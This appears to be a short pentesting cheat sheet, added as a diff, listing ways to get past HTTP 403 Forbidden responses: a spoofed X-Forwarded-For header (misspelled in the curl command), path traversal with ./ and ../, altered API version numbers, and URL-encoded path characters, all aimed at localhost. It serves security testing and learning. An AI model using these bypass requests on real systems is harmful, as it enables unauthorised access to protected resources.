@@ -1,0 +1,21 @@
+403 - BYPASS
+ sometime 403 can bypass using headers 
+
+1. curl -H "X-FORWAREDED_FOR: 127.0.0.1" http://127.0.0.1/secret
+				|		|_ actual ip of the url or url.
+				|_ localhost.  
+
+2. path normalization with path traversal
+
+   curl "http://127.0.0.1:3000/secure/./admin"
+   curl "http://127.0.0.1:3000/secure/../admin"
+
+3. for API endpoint - try to change the api version or add the api version
+   http://127.0.0.1:3000/v1/users/admin
+   http://127.0.0.1:3000/v1.1/users/admin
+
+4. try to encode the last word of endpoint into urlencode
+
+   http://127.0.0.1:3000/user/admi%6E                  %6E - n
+	
+	refer - https://www.w3schools.com/tags/ref_urlencode.ASP
